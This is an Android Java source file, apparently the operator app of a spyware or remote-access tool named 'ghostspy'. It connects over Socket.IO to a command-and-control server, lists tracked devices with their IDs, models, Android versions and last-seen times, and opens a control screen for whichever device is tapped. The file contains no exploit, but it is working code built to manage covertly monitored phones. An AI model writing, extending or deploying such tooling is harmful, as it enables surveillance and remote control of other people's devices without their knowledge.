package com.testapp;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.ViewGroup;
import android.widget.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONArray;
import org.json.JSONObject;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private Socket socket;
    private TextView statusText;
    private LinearLayout deviceContainer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        statusText = findViewById(R.id.statusText);
        deviceContainer = findViewById(R.id.deviceContainer);
        statusText.setText("Menghubungkan...");

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
        } catch (URISyntaxException e) {
            statusText.setText("❌ " + e.getMessage());
            return;
        }

        socket.on(Socket.EVENT_CONNECT, args -> {
            runOnUiThread(() -> {
                statusText.setText("Online");
                socket.emit("get_devices");
            });
        });
        socket.on("devices_list", args -> {
            try {
                JSONArray devices = (JSONArray) args[0];
                List<String[]> list = new ArrayList<>();
                for (int i = 0; i < devices.length(); i++) {
                    JSONObject d = devices.getJSONObject(i);
                    list.add(new String[]{d.getString("id"), d.getString("model"), d.optString("android","?"), d.optString("last_seen","")});
                }
                runOnUiThread(() -> {
                    deviceContainer.removeAllViews();
                    for (String[] data : list) {
                        // Card kaca
                        LinearLayout card = new LinearLayout(MainActivity.this);
                        card.setOrientation(LinearLayout.VERTICAL);
                        card.setBackground(getDrawable(R.drawable.glass_card));
                        card.setPadding(24,24,24,24);
                        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
                        lp.setMargins(0,0,0,16);
                        card.setLayoutParams(lp);

                        TextView idView = new TextView(MainActivity.this);
                        idView.setText("🆔 " + data[0]);
                        idView.setTextColor(0xFFFF1E5A);
                        idView.setTextSize(16);
                        TextView modelView = new TextView(MainActivity.this);
                        modelView.setText("📱 " + data[1] + " | " + data[2]);
                        modelView.setTextColor(0xFFFFFFFF);
                        TextView lastView = new TextView(MainActivity.this);
                        lastView.setText("🕒 " + data[3]);
                        lastView.setTextColor(0xFF9AA3B2);

                        card.addView(idView);
                        card.addView(modelView);
                        card.addView(lastView);

                        card.setOnClickListener(v -> {
                            Intent i = new Intent(MainActivity.this, ControlActivity.class);
                            i.putExtra("deviceId", data[0]);
                            startActivity(i);
                        });
                        deviceContainer.addView(card);
                    }
                    statusText.setText("Online • " + list.size() + " devices");
                });
            } catch (Exception e) {}
        });
        socket.on(Socket.EVENT_CONNECT_ERROR, args -> runOnUiThread(() -> statusText.setText("Offline")));
        socket.connect();
    }
}
